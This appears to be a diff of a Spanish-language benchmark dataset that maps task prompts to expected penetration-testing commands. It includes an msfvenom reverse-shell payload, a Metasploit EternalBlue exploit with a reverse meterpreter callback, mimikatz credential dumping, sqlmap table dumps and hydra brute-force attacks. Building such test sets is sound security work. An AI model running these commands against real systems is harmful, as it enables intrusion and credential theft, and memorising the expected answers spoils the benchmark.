@@ -1,35 +1,100 @@
-{"id": "b3_000", "question": "Escanea los puertos abiertos en 192.168.1.1 con detección de versión", "expected_command": "nmap -sV 192.168.1.1", "tool": "nmap"}
-{"id": "b3_001", "question": "Descubre hosts activos en la subred 10.0.0.0/24", "expected_command": "nmap -sn 10.0.0.0/24", "tool": "nmap"}
-{"id": "b3_002", "question": "Escanea con scripts de vulnerabilidades el host 10.10.10.5", "expected_command": "nmap --script vuln 10.10.10.5", "tool": "nmap"}
-{"id": "b3_003", "question": "Escaneo sigiloso SYN al host 192.168.1.100", "expected_command": "nmap -sS 192.168.1.100", "tool": "nmap"}
-{"id": "b3_004", "question": "Detecta el sistema operativo de 10.0.0.1", "expected_command": "nmap -O 10.0.0.1", "tool": "nmap"}
-{"id": "b3_005", "question": "Rompe el hash MD5 'abc123...' con wordlist rockyou.txt", "expected_command": "hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt", "tool": "hashcat"}
-{"id": "b3_006", "question": "Ataque de fuerza bruta a hash SHA256 con máscara ?a?a?a?a?a?a?a?a", "expected_command": "hashcat -m 1400 -a 3 hash.txt ?a?a?a?a?a?a?a?a", "tool": "hashcat"}
-{"id": "b3_007", "question": "Fuerza bruta SSH al host 10.0.0.1 usuario admin con rockyou.txt", "expected_command": "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1", "tool": "hydra"}
-{"id": "b3_008", "question": "Ataque de diccionario a formulario web login en 192.168.1.10", "expected_command": "hydra -l admin -P passwords.txt 192.168.1.10 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'", "tool": "hydra"}
-{"id": "b3_009", "question": "Enumera directorios en http://target.com con wordlist common.txt", "expected_command": "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt", "tool": "gobuster"}
-{"id": "b3_010", "question": "Busca subdominios de target.com con gobuster", "expected_command": "gobuster dns -d target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", "tool": "gobuster"}
-{"id": "b3_011", "question": "Detecta inyección SQL en http://site.com/page?id=1", "expected_command": "sqlmap -u 'http://site.com/page?id=1' --batch", "tool": "sqlmap"}
-{"id": "b3_012", "question": "Extrae todas las bases de datos del sitio vulnerable", "expected_command": "sqlmap -u 'http://site.com/page?id=1' --batch --dbs", "tool": "sqlmap"}
-{"id": "b3_013", "question": "Busca exploits de EternalBlue en Metasploit", "expected_command": "msfconsole -q -x 'search eternalblue'", "tool": "msfconsole"}
-{"id": "b3_014", "question": "Genera payload reverse shell Windows exe con msfvenom", "expected_command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe", "tool": "msfvenom"}
-{"id": "b3_015", "question": "Captura tráfico HTTP en interfaz eth0", "expected_command": "tcpdump -i eth0 port 80 -w capture.pcap", "tool": "tcpdump"}
-{"id": "b3_016", "question": "Muestra tráfico DNS en tiempo real", "expected_command": "tcpdump -i eth0 -n port 53", "tool": "tcpdump"}
-{"id": "b3_017", "question": "Verifica el certificado SSL de google.com", "expected_command": "openssl s_client -connect google.com:443 -showcerts", "tool": "openssl"}
-{"id": "b3_018", "question": "Genera un hash SHA256 del archivo malware.exe", "expected_command": "openssl dgst -sha256 malware.exe", "tool": "openssl"}
-{"id": "b3_019", "question": "Descarga el archivo de forma silenciosa desde una URL", "expected_command": "wget -q https://example.com/file.tar.gz -O /tmp/file.tar.gz", "tool": "wget"}
-{"id": "b3_020", "question": "Verifica si un servidor responde a peticiones HTTP", "expected_command": "curl -sI https://target.com | head -5", "tool": "curl"}
-{"id": "b3_021", "question": "Extrae todas las IPs únicas del archivo access.log", "expected_command": "grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' access.log | sort -u", "tool": "grep"}
-{"id": "b3_022", "question": "Cuenta intentos de login fallidos por IP en auth.log", "expected_command": "grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -rn", "tool": "grep"}
-{"id": "b3_023", "question": "Busca archivos modificados en las últimas 2 horas en /etc", "expected_command": "find /etc -mmin -120 -type f 2>/dev/null", "tool": "find"}
-{"id": "b3_024", "question": "Encuentra binarios con permiso SUID en el sistema", "expected_command": "find / -perm -4000 -type f 2>/dev/null", "tool": "find"}
-{"id": "b3_025", "question": "Muestra todas las conexiones TCP establecidas", "expected_command": "ss -tnp state established", "tool": "ss"}
-{"id": "b3_026", "question": "Lista puertos en escucha con el proceso asociado", "expected_command": "ss -tulnp", "tool": "ss"}
-{"id": "b3_027", "question": "Rompe hashes en hashes.txt con wordlist rockyou.txt usando John", "expected_command": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", "tool": "john"}
-{"id": "b3_028", "question": "Lista procesos de un volcado de memoria con Volatility3", "expected_command": "python3 vol.py -f memory.dmp windows.pslist", "tool": "python3"}
-{"id": "b3_029", "question": "Extrae artefactos de red de volcado de memoria", "expected_command": "python3 vol.py -f memory.dmp windows.netstat", "tool": "python3"}
-{"id": "b3_030", "question": "Bloquea tráfico entrante de la IP 192.168.1.105", "expected_command": "iptables -A INPUT -s 192.168.1.105 -j DROP", "tool": "iptables"}
-{"id": "b3_031", "question": "Permite tráfico SSH solo desde 10.0.0.0/24", "expected_command": "iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/24 -j ACCEPT", "tool": "iptables"}
-{"id": "b3_032", "question": "Calcula el hash SHA256 de un archivo", "expected_command": "sha256sum archivo.bin", "tool": "sha256sum"}
-{"id": "b3_033", "question": "Descomprime un archivo tar.gz", "expected_command": "tar -xzf archivo.tar.gz", "tool": "tar"}
-{"id": "b3_034", "question": "Muestra los últimos 100 eventos del sistema en syslog", "expected_command": "tail -100 /var/log/syslog", "tool": "tail"}
+{"prompt": "Escanear puertos abiertos y servicios en el host 192.168.1.100.", "expected": "nmap -sV 192.168.1.100", "tool": "nmap"}
+{"prompt": "Probar una URL para inyección SQL con un parámetro GET.", "expected": "sqlmap -u \"http://ejemplo.com/pagina.php?id=1\" --batch", "tool": "sqlmap"}
+{"prompt": "Iniciar la consola de Metasploit para comenzar una prueba de penetración.", "expected": "msfconsole", "tool": "metasploit"}
+{"prompt": "Crackear un archivo de hashes de contraseñas usando John the Ripper con una lista de palabras.", "expected": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", "tool": "john"}
+{"prompt": "Volcar credenciales de memoria en un sistema Windows.", "expected": "mimikatz # privilege::debug # sekurlsa::logonpasswords full", "tool": "mimikatz"}
+{"prompt": "Crackear un hash MD5 utilizando Hashcat con una lista de palabras.", "expected": "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt", "tool": "hashcat"}
+{"prompt": "Realizar un ataque de fuerza bruta contra un servicio SSH en 10.0.0.5.", "expected": "hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.5", "tool": "hydra"}
+{"prompt": "Enumerar directorios y archivos ocultos en un servidor web.", "expected": "gobuster dir -u http://ejemplo.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt", "tool": "gobuster"}
+{"prompt": "Capturar tráfico de red en la interfaz eth0 y guardarlo en un archivo.", "expected": "tcpdump -i eth0 -w capture.pcap", "tool": "tcpdump"}
+{"prompt": "Analizar un volcado de memoria de Windows para encontrar procesos en ejecución.", "expected": "vol.py -f memory.raw --profile=Win7SP1x64 pslist", "tool": "volatility"}
+{"prompt": "Abrir un archivo de captura de red para su análisis.", "expected": "wireshark capture.pcap", "tool": "wireshark"}
+{"prompt": "Poner una tarjeta de red inalámbrica en modo monitor.", "expected": "airmon-ng start wlan0", "tool": "aircrack-ng"}
+{"prompt": "Iniciar Burp Suite para interceptar tráfico HTTP/S.", "expected": "burpsuite", "tool": "burpsuite"}
+{"prompt": "Escanear vulnerabilidades comunes en un servidor web.", "expected": "nikto -h http://ejemplo.com", "tool": "nikto"}
+{"prompt": "Escanear un sitio de WordPress en busca de vulnerabilidades y plugins desactualizados.", "expected": "wpscan --url http://ejemplo.com --enumerate vp,vt,u", "tool": "wpscan"}
+{"prompt": "Realizar fuzzing de subdominios en un dominio dado.", "expected": "ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://FUZZ.ejemplo.com", "tool": "ffuf"}
+{"prompt": "Descubrir directorios y archivos ocultos en un servidor web usando un diccionario.", "expected": "dirb http://ejemplo.com /usr/share/wordlists/dirb/common.txt", "tool": "dirb"}
+{"prompt": "Escanear rápidamente los puertos más comunes en un rango de IPs.", "expected": "masscan 192.168.1.0/24 -p1-65535 --rate 100000", "tool": "masscan"}
+{"prompt": "Iniciar Responder para capturar hashes NTLMv2 en una red.", "expected": "responder -I eth0 -wrf", "tool": "responder"}
+{"prompt": "Iniciar la interfaz gráfica de BloodHound para análisis de Active Directory.", "expected": "bloodhound", "tool": "bloodhound"}
+{"prompt": "Realizar un escaneo de puertos UDP en un host específico.", "expected": "nmap -sU 10.0.0.1", "tool": "nmap"}
+{"prompt": "Escanear una URL para inyección SQL y volcar todas las bases de datos.", "expected": "sqlmap -u \"http://ejemplo.com/index.php?id=1\" --dbs --batch", "tool": "sqlmap"}
+{"prompt": "Usar un exploit específico en Metasploit y establecer el RHOST.", "expected": "msfconsole -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; exploit\"", "tool": "metasploit"}
+{"prompt": "Crackear un archivo de hashes de tipo ZIP utilizando John the Ripper.", "expected": "john --format=zip --wordlist=/usr/share/wordlists/rockyou.txt zip_hashes.txt", "tool": "john"}
+{"prompt": "Exportar certificados desde el almacén de certificados de Windows.", "expected": "mimikatz # crypto::certificates /export", "tool": "mimikatz"}
+{"prompt": "Escanear puertos TCP abiertos en un rango específico de IPs para encontrar servicios web.", "expected": "nmap -p 80,443 -oA web_scan 192.168.1.0/24", "tool": "nmap"}
+{"prompt": "Crackear un hash MD5 a partir de un archivo usando una wordlist y un ataque de diccionario.", "expected": "hashcat -m 0 -a 0 hashes.txt wordlist.txt", "tool": "hashcat"}
+{"prompt": "Realizar un ataque de fuerza bruta contra un servicio SSH usando un archivo de usuarios y contraseñas.", "expected": "hydra -L users.txt -P passwords.txt ssh://10.0.0.10", "tool": "hydra"}
+{"prompt": "Enumerar directorios y archivos ocultos en un servidor web usando un wordlist común.", "expected": "gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt", "tool": "gobuster"}
+{"prompt": "Detectar y explotar vulnerabilidades de inyección SQL en una URL específica.", "expected": "sqlmap -u \"http://example.com/index.php?id=1\" --batch --risk=3 --level=5", "tool": "sqlmap"}
+{"prompt": "Capturar todo el tráfico de red en la interfaz eth0 y guardarlo en un archivo PCAP.", "expected": "tcpdump -i eth0 -w capture.pcap", "tool": "tcpdump"}
+{"prompt": "Analizar un volcado de memoria de Windows para listar los procesos activos.", "expected": "volatility -f memdump.raw --profile=Win7SP1x64 pslist", "tool": "volatility"}
+{"prompt": "Abrir un archivo PCAP capturado y filtrar solo el tráfico HTTP en la interfaz gráfica.", "expected": "wireshark -r capture.pcap -Y \"http\"", "tool": "wireshark"}
+{"prompt": "Iniciar la consola de Metasploit para comenzar a buscar exploits de forma silenciosa.", "expected": "msfconsole -q", "tool": "metasploit"}
+{"prompt": "Crackear contraseñas de un archivo de hashes de Linux (/etc/shadow) usando John the Ripper.", "expected": "john --format=sha512crypt shadow.txt", "tool": "john"}
+{"prompt": "Poner una interfaz inalámbrica en modo monitor para capturar paquetes.", "expected": "airmon-ng start wlan0", "tool": "aircrack-ng"}
+{"prompt": "Iniciar Burp Suite en modo headless para escanear una URL específica.", "expected": "java -jar burpsuite_pro.jar --headless --project-file=project.burp --url=http://example.com --scope-include=http://example.com/*", "tool": "burpsuite"}
+{"prompt": "Realizar un escaneo de vulnerabilidades básico en un servidor web con Nikto.", "expected": "nikto -h http://example.com", "tool": "nikto"}
+{"prompt": "Escanear un sitio de WordPress en busca de vulnerabilidades, plugins y temas enumerados.", "expected": "wpscan --url http://example.com --enumerate vp,vt,u --api-token YOUR_API_TOKEN", "tool": "wpscan"}
+{"prompt": "Realizar un fuzzing de subdominios para un dominio dado utilizando una wordlist.", "expected": "ffuf -w /usr/share/wordlists/subdomains/subdomains-top1M-5000.txt -u http://FUZZ.example.com", "tool": "ffuf"}
+{"prompt": "Buscar directorios y archivos ocultos en un servidor web usando el diccionario por defecto de Dirb.", "expected": "dirb http://example.com", "tool": "dirb"}
+{"prompt": "Escanear rápidamente un rango de IPs para el puerto 80 a una alta velocidad.", "expected": "masscan -p80 10.0.0.0/8 --rate 100000", "tool": "masscan"}
+{"prompt": "Iniciar Responder para capturar hashes NTLMv2 en una red local en la interfaz eth0.", "expected": "responder -I eth0 -wrf", "tool": "responder"}
+{"prompt": "Recopilar datos de un dominio de Active Directory usando BloodHound.py en Linux.", "expected": "bloodhound-python -u 'user@example.local' -p 'password' -ns 10.0.0.1 --collectionmethod All", "tool": "bloodhound"}
+{"prompt": "Ejecutar Mimikatz en una máquina Windows comprometida para extraer credenciales en texto plano.", "expected": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords full\"", "tool": "mimikatz"}
+{"prompt": "Realizar un escaneo de versión de servicios y detección de sistema operativo en un host específico.", "expected": "nmap -sV -O 192.168.1.1", "tool": "nmap"}
+{"prompt": "Crackear una contraseña WPA/WPA2 capturada (handshake) usando un ataque de diccionario.", "expected": "hashcat -m 2500 -a 0 handshake.hccapx wordlist.txt", "tool": "hashcat"}
+{"prompt": "Enumerar las bases de datos en un sistema vulnerable a inyección SQL a través de una URL.", "expected": "sqlmap -u \"http://example.com/page.php?id=1\" --dbs", "tool": "sqlmap"}
+{"prompt": "Cargar un módulo auxiliar de Metasploit para escanear puertos TCP en un rango de hosts.", "expected": "msfconsole -x \"use auxiliary/scanner/portscan/tcp; set RHOSTS 10.0.0.0/24; run\"", "tool": "metasploit"}
+{"prompt": "Generar un reporte HTML de un escaneo de Burp Suite previamente realizado en modo headless.", "expected": "java -jar burpsuite_pro.jar --headless --project-file=project.burp --generate-report=report.html --report-format=HTML", "tool": "burpsuite"}
+{"prompt": "Escanea los puertos abiertos del host 192.168.1.100 y detecta los servicios.", "expected": "nmap -sV -p- 192.168.1.100", "tool": "nmap"}
+{"prompt": "Intenta descifrar un hash SHA1 usando un ataque de diccionario con una lista de palabras llamada 'passwords.txt'.", "expected": "hashcat -m 100 -a 0 hash.txt passwords.txt", "tool": "hashcat"}
+{"prompt": "Realiza un ataque de fuerza bruta contra un servidor FTP en 10.0.0.1, intentando usuarios de 'users.txt' y contraseñas de 'pass.txt'.", "expected": "hydra -L users.txt -P pass.txt ftp://10.0.0.1", "tool": "hydra"}
+{"prompt": "Busca directorios y archivos ocultos en un sitio web con la URL 'http://ejemplo.com' usando una lista de palabras común.", "expected": "gobuster dir -u http://ejemplo.com -w /usr/share/wordlists/dirb/common.txt", "tool": "gobuster"}
+{"prompt": "Prueba una URL vulnerable a inyección SQL para enumerar las bases de datos.", "expected": "sqlmap -u \"http://ejemplo.com/vulnerable.php?id=1\" --dbs", "tool": "sqlmap"}
+{"prompt": "Captura el tráfico de red en la interfaz 'eth0' y lo guarda en un archivo llamado 'captura.pcap', mostrando solo los paquetes HTTP.", "expected": "tcpdump -i eth0 -w captura.pcap 'tcp port 80'", "tool": "tcpdump"}
+{"prompt": "Analiza un volcado de memoria de Windows (memdump.raw) para listar los procesos activos, asumiendo un perfil 'Win7SP1x64'.", "expected": "volatility -f memdump.raw --profile=Win7SP1x64 pslist", "tool": "volatility"}
+{"prompt": "Abre un archivo de captura de red 'network.pcap' para su análisis.", "expected": "wireshark network.pcap", "tool": "wireshark"}
+{"prompt": "Inicia la consola de Metasploit Framework.", "expected": "msfconsole", "tool": "metasploit"}
+{"prompt": "Intenta descifrar un archivo de hashes de contraseñas (hashes.txt) usando el modo de ataque predeterminado de John the Ripper.", "expected": "john hashes.txt", "tool": "john"}
+{"prompt": "Intenta crackear una contraseña WPA2 de un archivo de captura 'wpa2_capture.cap' usando un diccionario.", "expected": "aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa2_capture.cap", "tool": "aircrack-ng"}
+{"prompt": "Inicia Burp Suite para interceptar y analizar el tráfico web.", "expected": "burpsuite", "tool": "burpsuite"}
+{"prompt": "Escanea un servidor web en 'http://ejemplo.com' en busca de vulnerabilidades comunes y archivos sensibles.", "expected": "nikto -h http://ejemplo.com", "tool": "nikto"}
+{"prompt": "Escanea un sitio de WordPress en 'http://ejemplo.com/wordpress' para detectar vulnerabilidades en plugins y temas.", "expected": "wpscan --url http://ejemplo.com/wordpress --enumerate vp,vt", "tool": "wpscan"}
+{"prompt": "Realiza un fuzzing de subdominios para el dominio 'ejemplo.com' usando una lista de palabras.", "expected": "ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.ejemplo.com", "tool": "ffuf"}
+{"prompt": "Escanea un servidor web en 'http://ejemplo.com' en busca de directorios y archivos ocultos usando la lista de palabras predeterminada de Dirb.", "expected": "dirb http://ejemplo.com", "tool": "dirb"}
+{"prompt": "Escanea rápidamente los puertos 80 y 443 en un rango de IPs (192.168.1.0/24) a una alta velocidad.", "expected": "masscan -p80,443 192.168.1.0/24 --rate 100000", "tool": "masscan"}
+{"prompt": "Inicia Responder en la interfaz 'eth0' para capturar credenciales LLMNR/NBT-NS.", "expected": "responder -I eth0", "tool": "responder"}
+{"prompt": "Inicia el cliente de BloodHound para visualizar las relaciones de Active Directory.", "expected": "bloodhound", "tool": "bloodhound"}
+{"prompt": "Ejecuta Mimikatz para volcar credenciales de memoria en un sistema Windows.", "expected": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords full\" exit", "tool": "mimikatz"}
+{"prompt": "Realiza un escaneo de puertos UDP comunes en el host 192.168.1.101.", "expected": "nmap -sU 192.168.1.101", "tool": "nmap"}
+{"prompt": "Intenta descifrar un hash MD5 utilizando un ataque de máscara con un patrón específico.", "expected": "hashcat -m 0 -a 3 hash.txt ?l?d?d?d?d?d", "tool": "hashcat"}
+{"prompt": "Busca subdominios para el dominio 'ejemplo.com' utilizando un ataque de fuerza bruta basado en nombres de host virtuales.", "expected": "gobuster vhost -u ejemplo.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt", "tool": "gobuster"}
+{"prompt": "Busca exploits relacionados con el \"EternalBlue\" (MS17-010) dentro de la consola de Metasploit.", "expected": "msfconsole -x \"search ms17-010; exit\"", "tool": "metasploit"}
+{"prompt": "Intenta descifrar un hash NTLM específico con John the Ripper.", "expected": "john --format=NT hash_ntlm.txt", "tool": "john"}
+{"prompt": "Escanea los puertos abiertos y el sistema operativo de un host específico en la red 192.168.1.100.", "expected": "nmap -O -sV 192.168.1.100", "tool": "nmap"}
+{"prompt": "Intenta descifrar un hash MD5 almacenado en un archivo 'hash.txt' usando un diccionario 'wordlist.txt'.", "expected": "hashcat -m 0 -a 0 hash.txt wordlist.txt", "tool": "hashcat"}
+{"prompt": "Realiza un ataque de fuerza bruta contra el servicio SSH del host 10.0.0.1 con el usuario 'admin' y un archivo de contraseñas 'passwords.txt'.", "expected": "hydra -l admin -P passwords.txt ssh://10.0.0.1", "tool": "hydra"}
+{"prompt": "Enumera directorios y archivos en un sitio web usando el modo 'dir' y una wordlist común.", "expected": "gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt", "tool": "gobuster"}
+{"prompt": "Prueba la existencia de inyección SQL en una URL específica con un parámetro vulnerable.", "expected": "sqlmap -u \"http://target.com/page.php?id=1\" --batch", "tool": "sqlmap"}
+{"prompt": "Captura todo el tráfico de red en la interfaz eth0 y guárdalo en un archivo 'capture.pcap'.", "expected": "tcpdump -i eth0 -w capture.pcap", "tool": "tcpdump"}
+{"prompt": "Inicia la consola de Metasploit para comenzar una tarea de explotación.", "expected": "msfconsole", "tool": "metasploit"}
+{"prompt": "Realiza un escaneo sigiloso (SYN) de los puertos del 1 al 1024 en la IP 172.16.0.5.", "expected": "nmap -sS -p 1-1024 172.16.0.5", "tool": "nmap"}
+{"prompt": "Intenta descifrar contraseñas NTLM de un archivo de hashes 'ntlm_hashes.txt' utilizando un ataque de máscara con caracteres especiales.", "expected": "hashcat -m 1000 -a 3 ntlm_hashes.txt '?a?a?a?a?a?a?a?a'", "tool": "hashcat"}
+{"prompt": "Realiza un ataque de fuerza bruta contra un servidor FTP en 192.168.1.10 con usuarios y contraseñas de archivos separados.", "expected": "hydra -L users.txt -P passwords.txt ftp://192.168.1.10", "tool": "hydra"}
+{"prompt": "Busca subdominios para el dominio 'example.com' usando una wordlist de subdominios.", "expected": "gobuster vhost -u http://example.com -w /usr/share/wordlists/subdomains-top1million-10000.txt", "tool": "gobuster"}
+{"prompt": "Enumera las bases de datos en un objetivo vulnerable a SQL Injection.", "expected": "sqlmap -u \"http://target.com/page.php?id=1\" --dbs", "tool": "sqlmap"}
+{"prompt": "Muestra los paquetes HTTP (puerto 80) que van o vienen del host 192.168.1.1.", "expected": "tcpdump -i eth0 'host 192.168.1.1 and port 80'", "tool": "tcpdump"}
+{"prompt": "Busca exploits en la base de datos de Metasploit relacionados con 'SMB'.", "expected": "msfconsole -x \"search smb\"", "tool": "metasploit"}
+{"prompt": "Escanea una subred completa 192.168.1.0/24 para descubrir hosts activos.", "expected": "nmap -sn 192.168.1.0/24", "tool": "nmap"}
+{"prompt": "Descifra un hash SHA1 usando un ataque de diccionario y mostrando el proceso.", "expected": "hashcat -m 100 -a 0 hash_sha1.txt common_passwords.txt --show", "tool": "hashcat"}
+{"prompt": "Realiza un ataque de fuerza bruta contra un panel de administración HTTP en 10.0.0.100 en el puerto 8080.", "expected": "hydra -l admin -P passwords.txt 10.0.0.100 http-get /admin/login", "tool": "hydra"}
+{"prompt": "Escanea directorios en un sitio web, excluyendo las respuestas 404 y 403.", "expected": "gobuster dir -u http://testsite.com -w /usr/share/wordlists/dirb/common.txt -b 404,403", "tool": "gobuster"}
+{"prompt": "Obtén el nombre de usuario y la contraseña de la tabla 'users' en una base de datos específica.", "expected": "sqlmap -u \"http://target.com/page.php?id=1\" -D database_name -T users --dump", "tool": "sqlmap"}
+{"prompt": "Muestra los paquetes SSH (puerto 22) en la interfaz eth0, sin resolver nombres de host ni puertos.", "expected": "tcpdump -i eth0 -nn port 22", "tool": "tcpdump"}
+{"prompt": "Explota una vulnerabilidad MS17-010 (EternalBlue) en un host remoto.", "expected": "msfconsole -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.10; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.5; exploit\"", "tool": "metasploit"}
+{"prompt": "Realiza un escaneo rápido de puertos de los 1000 puertos más comunes en el host 192.168.1.10.", "expected": "nmap -F 192.168.1.10", "tool": "nmap"}
+{"prompt": "Intenta descifrar un hash de WPA/WPA2 capturado en un archivo .hccapx usando un diccionario.", "expected": "hashcat -m 2500 -a 0 wpa_capture.hccapx wordlist.txt", "tool": "hashcat"}
+{"prompt": "Realiza un ataque de fuerza bruta a un servicio RDP en 10.0.0.20 usando un usuario y una lista de contraseñas.", "expected": "hydra -l user -P passwords.txt rdp://10.0.0.20", "tool": "hydra"}
+{"prompt": "Realiza un escaneo de directorios en una URL HTTPS, especificando un User-Agent personalizado.", "expected": "gobuster dir -u https://secureapp.com -w /usr/share/wordlists/dirb/big.txt -A \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\"", "tool": "gobuster"}
